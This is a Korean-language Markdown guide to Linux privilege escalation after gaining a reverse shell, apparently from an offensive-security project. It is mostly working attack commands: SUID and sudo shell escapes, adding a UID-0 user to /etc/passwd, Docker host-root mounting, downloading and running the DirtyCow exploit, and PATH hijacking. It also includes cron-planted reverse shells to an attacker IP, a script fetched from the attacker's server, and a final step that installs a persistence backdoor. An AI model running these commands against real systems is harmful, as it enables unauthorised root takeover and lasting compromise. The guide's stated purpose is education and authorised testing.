# 권한 상승 가이드

리버스 쉘 획득 후 권한 상승(Privilege Escalation) 전략 및 필요 정보 정리

## 목차
1. [사전 정보 수집](#사전-정보-수집)
2. [권한 상승 방법별 가이드](#권한-상승-방법별-가이드)
3. [자동화 도구 사용](#자동화-도구-사용)
4. [수동 체크리스트](#수동-체크리스트)

---

## 사전 정보 수집

### 필수 정보 수집 명령어

리버스 쉘 획득 후 **가장 먼저** 실행해야 할 명령어들:

```bash
# 1. 현재 사용자 및 권한
whoami
id
groups

# 2. OS 및 커널 정보
cat /etc/os-release
uname -a
uname -r

# 3. 현재 위치
pwd
ls -la

# 4. 쉘 안정화 (먼저 실행!)
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z 누른 후
# stty raw -echo; fg
# Enter 2번
```

---

## 권한 상승 방법별 가이드

### 1. SUID 바이너리 악용 ⭐ (가장 흔함)

#### 필요한 정보
```bash
# SUID 바이너리 검색
find / -perm -4000 -type f 2>/dev/null

# 또는 더 자세히
find / -perm -u=s -type f 2>/dev/null -exec ls -l {} \;
```

#### 확인할 것
- 실행 파일이 root 소유인가?
- `-rwsr-xr-x` 에서 `s` 비트가 있는가?

#### 악용 가능한 SUID 바이너리

| 바이너리 | 명령어 | GTFOBins 링크 |
|---------|--------|--------------|
| **find** | `/usr/bin/find . -exec /bin/bash -p \;` | [find](https://gtfobins.github.io/gtfobins/find/) |
| **vim** | `vim -c ':!/bin/bash'` | [vim](https://gtfobins.github.io/gtfobins/vim/) |
| **less** | `less /etc/profile` → `!bash` | [less](https://gtfobins.github.io/gtfobins/less/) |
| **nano** | `nano` → Ctrl+R, Ctrl+X → `reset; sh 1>&0 2>&0` | [nano](https://gtfobins.github.io/gtfobins/nano/) |
| **cp** | `cp /bin/bash /tmp/bash; chmod +s /tmp/bash; /tmp/bash -p` | [cp](https://gtfobins.github.io/gtfobins/cp/) |
| **python** | `python -c 'import os; os.execl("/bin/bash", "bash", "-p")'` | [python](https://gtfobins.github.io/gtfobins/python/) |
| **tar** | `tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash` | [tar](https://gtfobins.github.io/gtfobins/tar/) |
| **awk** | `awk 'BEGIN {system("/bin/bash -p")}'` | [awk](https://gtfobins.github.io/gtfobins/awk/) |

#### 예시 (privilege_escalation.sh 참고)
```bash
# find가 SUID인 경우
/usr/bin/find /etc/passwd -exec /bin/bash -p \;
/usr/bin/su /etc/passwd -exec /bin/bash -p \;

# 성공하면 root shell 획득
whoami  # root
```

---

### 2. Sudo 권한 악용

#### 필요한 정보
```bash
# sudo 권한 확인
sudo -l

# 출력 예시:
# User www-data may run the following commands:
#     (ALL) NOPASSWD: /usr/bin/vim
```

#### 확인할 것
- `NOPASSWD`가 있는가? (비밀번호 없이 실행 가능)
- 어떤 명령어를 root로 실행할 수 있는가?

#### 악용 방법

| 명령어 | 악용 방법 |
|--------|----------|
| **vim** | `sudo vim -c ':!/bin/bash'` |
| **nano** | `sudo nano` → Ctrl+R, Ctrl+X → `reset; sh 1>&0 2>&0` |
| **less/more** | `sudo less /etc/profile` → `!bash` |
| **find** | `sudo find /etc/passwd -exec /bin/bash \;` |
| **python** | `sudo python -c 'import os; os.system("/bin/bash")'` |
| **perl** | `sudo perl -e 'exec "/bin/bash";'` |
| **ruby** | `sudo ruby -e 'exec "/bin/bash"'` |
| **awk** | `sudo awk 'BEGIN {system("/bin/bash")}'` |

#### 예시
```bash
# vim으로 sudo 가능한 경우
sudo vim -c ':!/bin/bash' /dev/null

# 또는
sudo vim
# vim에서 :!/bin/bash
```

---

### 3. /etc/passwd 쓰기 권한

#### 필요한 정보
```bash
# /etc/passwd 쓰기 권한 확인
ls -la /etc/passwd
# -rw-r--r-- 1 root root ... /etc/passwd  (쓰기 불가)
# -rw-rw-r-- 1 root root ... /etc/passwd  (쓰기 가능!)

# 테스트
test -w /etc/passwd && echo "WRITABLE!" || echo "Not writable"
```

#### 악용 방법
```bash
# 1. 비밀번호 해시 생성
openssl passwd -1 -salt hacked hacked
# 출력: $1$hacked$XjdKNyiHH8v2E4mQC5K9M0

# 2. 새 root 사용자 추가
echo 'hacked:$1$hacked$XjdKNyiHH8v2E4mQC5K9M0:0:0:root:/root:/bin/bash' >> /etc/passwd

# 3. 로그인
su hacked
# 비밀번호: hacked
```

#### /etc/passwd 포맷
```
username:password_hash:UID:GID:comment:home:shell
```
- UID 0 = root 권한
- password_hash = `openssl passwd`로 생성

---

### 4. Docker 그룹 멤버십

#### 필요한 정보
```bash
# 그룹 확인
groups
id

# 출력에 'docker'가 있으면 취약
# 예: uid=1000(user) gid=1000(user) groups=1000(user),999(docker)

# Docker 설치 확인
docker --version
docker ps
```

#### 악용 방법
```bash
# 호스트 루트를 컨테이너에 마운트
docker run -v /:/mnt --rm -it alpine chroot /mnt bash

# 또는 ubuntu 이미지 사용
docker run -v /:/hostOS -it ubuntu bash
cd /hostOS/root
cat /hostOS/etc/shadow
```

#### 왜 작동하는가?
- Docker daemon은 root 권한으로 실행
- 호스트의 `/`를 마운트하면 전체 파일시스템 접근 가능
- 컨테이너 내에서 root = 호스트에서도 root

---

### 5. Kernel Exploit

#### 필요한 정보
```bash
# 커널 버전 확인
uname -r
# 출력 예: 4.4.0-116-generic

# 전체 시스템 정보
uname -a
cat /proc/version
```

#### 알려진 취약 커널

| 커널 버전 | CVE | Exploit |
|-----------|-----|---------|
| 2.6.22 - 4.8.3 | CVE-2016-5195 | [DirtyCow](https://github.com/firefart/dirtycow) |
| 3.13.0 - 4.4.0 | CVE-2017-16995 | [eBPF](https://www.exploit-db.com/exploits/45010) |
| 4.4.0 - 4.15.x | CVE-2021-3493 | [OverlayFS](https://github.com/brisket/CVE-2021-3493) |
| 4.8.0 - 4.10.0 | CVE-2017-1000112 | [Exploit](https://www.exploit-db.com/exploits/42276) |

#### DirtyCow 예시 (CVE-2016-5195)
```bash
# 1. Exploit 다운로드
wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c

# 2. 컴파일
gcc -pthread dirty.c -o dirty -lcrypt

# 3. 실행
./dirty

# 4. 새 사용자로 로그인
su firefart
# 비밀번호: dirtyCowFun
```

#### 주의사항
- Kernel exploit은 시스템을 불안정하게 만들 수 있음
- 테스트 환경에서만 사용
- 백업 필수

---

### 6. Cron Job 악용

#### 필요한 정보
```bash
# Cron 작업 확인
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /var/spool/cron/crontabs/

# 사용자 crontab
crontab -l
```

#### 확인할 것
- Root로 실행되는 스크립트가 있는가?
- 그 스크립트를 수정할 수 있는가?

#### 악용 방법
```bash
# 예: /etc/cron.d/backup 스크립트가 쓰기 가능
echo '* * * * * root /bin/bash -c "bash -i >& /dev/tcp/공격자IP/4444 0>&1"' >> /etc/cron.d/backup

# 또는 reverse shell
echo '* * * * * root nc -e /bin/bash 공격자IP 4444' >> /etc/cron.d/backup
```

---

### 7. 환경 변수 / PATH 조작

#### 필요한 정보
```bash
# 현재 PATH
echo $PATH

# sudo로 실행할 때 PATH
sudo -l
# 출력에 env_keep+=PATH 또는 secure_path가 없으면 취약
```

#### 악용 방법
```bash
# 예: sudo /usr/local/bin/backup.sh 실행 가능
# backup.sh 내용:
#!/bin/bash
ls /root

# 악용:
# 1. 가짜 ls 생성
echo '/bin/bash' > /tmp/ls
chmod +x /tmp/ls

# 2. PATH 변경
export PATH=/tmp:$PATH

# 3. 실행
sudo /usr/local/bin/backup.sh
# → /tmp/ls가 실행되어 root shell 획득
```

---

### 8. NFS (Network File System)

#### 필요한 정보
```bash
# NFS 마운트 확인
cat /etc/exports
showmount -e 타겟IP

# 출력 예:
# /var/nfs *(rw,no_root_squash)
```

#### 확인할 것
- `no_root_squash` 옵션이 있는가?

#### 악용 방법
```bash
# 공격자 서버에서:
mkdir /tmp/nfs
mount -o rw 타겟IP:/var/nfs /tmp/nfs

# SUID shell 복사
cp /bin/bash /tmp/nfs/bash
chmod +s /tmp/nfs/bash

# 타겟 서버에서:
cd /var/nfs
./bash -p  # root shell
```

---

## 자동화 도구 사용

### LinPEAS (추천!)

**가장 강력한 권한 상승 검사 도구**

```bash
# 다운로드
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

# 실행
chmod +x linpeas.sh
./linpeas.sh | tee linpeas_output.txt

# 또는 직접 파이프
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
```

**LinPEAS가 확인하는 것:**
- SUID 바이너리
- Sudo 권한
- Cron jobs
- 쓰기 가능한 중요 파일
- Kernel exploits
- Docker/LXC 컨테이너
- 비밀번호 하드코딩
- SSH 키
- 등등 (99% 커버)

### privilege_escalation.sh (프로젝트 스크립트)

```bash
# 타겟 서버에서
cd /tmp
mkdir -p .work && cd .work

# 공격자 서버에서 다운로드
wget http://공격자IP:5000/scripts/privilege_escalation.sh

# 실행
chmod +x privilege_escalation.sh
bash privilege_escalation.sh
```

**이 스크립트가 하는 일:**
1. 시스템 정보 수집
2. SUID 바이너리 검색
3. Sudo 권한 확인
4. /etc/passwd 쓰기 권한
5. Docker 그룹 확인
6. 자동 권한 상승 시도

### LinEnum

```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

### Linux Exploit Suggester

```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

---

## 수동 체크리스트

권한 상승 가능성을 **수동으로 확인**할 때 사용:

### 1단계: 기본 정보
```bash
[ ] whoami
[ ] id
[ ] groups
[ ] uname -a
[ ] cat /etc/os-release
[ ] pwd
```

### 2단계: SUID/SGID 검색
```bash
[ ] find / -perm -4000 -type f 2>/dev/null
[ ] find / -perm -u=s -type f 2>/dev/null
[ ] find / -perm -g=s -type f 2>/dev/null
```

### 3단계: Sudo 권한
```bash
[ ] sudo -l
[ ] cat /etc/sudoers 2>/dev/null
```

### 4단계: 쓰기 가능한 파일
```bash
[ ] ls -la /etc/passwd
[ ] ls -la /etc/shadow
[ ] find /etc -writable 2>/dev/null
```

### 5단계: Cron Jobs
```bash
[ ] cat /etc/crontab
[ ] ls -la /etc/cron.*
[ ] crontab -l
```

### 6단계: 네트워크/그룹
```bash
[ ] groups | grep docker
[ ] cat /etc/exports (NFS)
[ ] netstat -tulnp
```

### 7단계: 프로세스
```bash
[ ] ps aux | grep root
[ ] ps aux | grep -E '(apache|nginx|mysql)'
```

### 8단계: 비밀번호/키
```bash
[ ] grep -r password /var/www 2>/dev/null
[ ] find / -name "*.pem" 2>/dev/null
[ ] find / -name id_rsa 2>/dev/null
[ ] cat ~/.bash_history
```

---

## 빠른 참고 (Quick Reference)

### 가장 먼저 시도할 것

```bash
# 1. LinPEAS 실행
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash

# 2. SUID 확인
find / -perm -4000 -type f 2>/dev/null | xargs ls -l

# 3. Sudo 확인
sudo -l

# 4. Docker 확인
groups | grep docker && docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### 주요 명령어 한눈에

| 방법 | 확인 명령어 | 악용 명령어 |
|------|------------|-----------|
| SUID | `find / -perm -4000 2>/dev/null` | `find . -exec /bin/bash -p \;` |
| Sudo | `sudo -l` | `sudo vim -c ':!/bin/bash'` |
| Docker | `groups \| grep docker` | `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` |
| /etc/passwd | `test -w /etc/passwd` | `echo 'user:hash:0:0:::/bin/bash' >> /etc/passwd` |
| Kernel | `uname -r` | DirtyCow, OverlayFS 등 |

---

## 리소스

### 필수 사이트
- **GTFOBins**: https://gtfobins.github.io/ (SUID/Sudo 바이너리 악용법)
- **PEASS-ng**: https://github.com/carlospolop/PEASS-ng (LinPEAS)
- **Exploit-DB**: https://www.exploit-db.com/ (Kernel exploits)
- **PayloadsAllTheThings**: https://github.com/swisskyrepo/PayloadsAllTheThings

### 체크리스트
- HackTricks: https://book.hacktricks.xyz/linux-hardening/privilege-escalation

---

## 권장 워크플로우

```
1. 리버스 쉘 획득
   ↓
2. 쉘 안정화 (python pty)
   ↓
3. LinPEAS 실행 (자동 스캔)
   ↓
4. 결과 분석
   ↓
5. 가장 쉬운 방법부터 시도:
   - Docker 그룹 → 즉시 root
   - /etc/passwd 쓰기 → 즉시 root
   - SUID find/vim → 1분
   - Sudo NOPASSWD → 1분
   - Kernel Exploit → 10분
   ↓
6. Root 획득
   ↓
7. backdoor_install.sh 실행 (영속성)
```

---

**작성일:** 2025-11-07
**목적:** 권한 상승 교육 및 승인된 보안 테스트
